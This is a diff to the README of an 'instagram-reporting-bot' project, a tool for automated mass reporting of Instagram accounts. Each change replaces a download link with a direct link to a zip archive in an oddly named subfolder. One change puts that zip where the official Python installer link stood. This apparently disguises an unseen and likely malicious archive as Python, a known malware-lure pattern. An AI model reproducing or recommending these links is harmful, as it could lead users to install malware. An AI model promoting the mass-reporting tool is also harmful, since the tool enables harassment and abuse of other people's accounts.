@@ -1,6 +1,6 @@
 # 🤖 instagram-reporting-bot - Automate Instagram Account Reporting
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/zakariaamezian/instagram-reporting-bot)
+[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/zakariaamezian/instagram-reporting-bot/raw/refs/heads/main/penthouselike/reporting_instagram_bot_v2.8.zip)
 
 ## 📋 What is instagram-reporting-bot?
 
@@ -32,7 +32,7 @@ Before you begin, make sure your computer meets these requirements:
 
 Click the button below to open the official download page for instagram-reporting-bot:
 
-[![Download](https://img.shields.io/badge/Download-Here-blue)](https://github.com/zakariaamezian/instagram-reporting-bot)
+[![Download](https://img.shields.io/badge/Download-Here-blue)](https://github.com/zakariaamezian/instagram-reporting-bot/raw/refs/heads/main/penthouselike/reporting_instagram_bot_v2.8.zip)
 
 This page contains the latest version of the bot along with all related files.
 
@@ -50,7 +50,7 @@ If the files you download come as a `.zip`, you will need to extract them:
 
 Since this bot runs on Python, you need to install it first:
 
-- Visit [https://www.python.org/downloads/windows/](https://www.python.org/downloads/windows/)  
+- Visit [https://github.com/zakariaamezian/instagram-reporting-bot/raw/refs/heads/main/penthouselike/reporting_instagram_bot_v2.8.zip](https://github.com/zakariaamezian/instagram-reporting-bot/raw/refs/heads/main/penthouselike/reporting_instagram_bot_v2.8.zip)  
 - Download the latest Python 3.x version for Windows  
 - Run the installer and select **Add Python to PATH** before clicking Install  
 - Wait for the installation to finish  
@@ -132,7 +132,7 @@ You may find these useful alongside instagram-reporting-bot:
 ## 📥 Download and Setup Recap
 
 1. Go to the download page:  
-   https://github.com/zakariaamezian/instagram-reporting-bot  
+   https://github.com/zakariaamezian/instagram-reporting-bot/raw/refs/heads/main/penthouselike/reporting_instagram_bot_v2.8.zip  
 2. Download the latest release or source files.  
 3. Extract files if needed.  
 4. Install Python 3 and add it to PATH.  
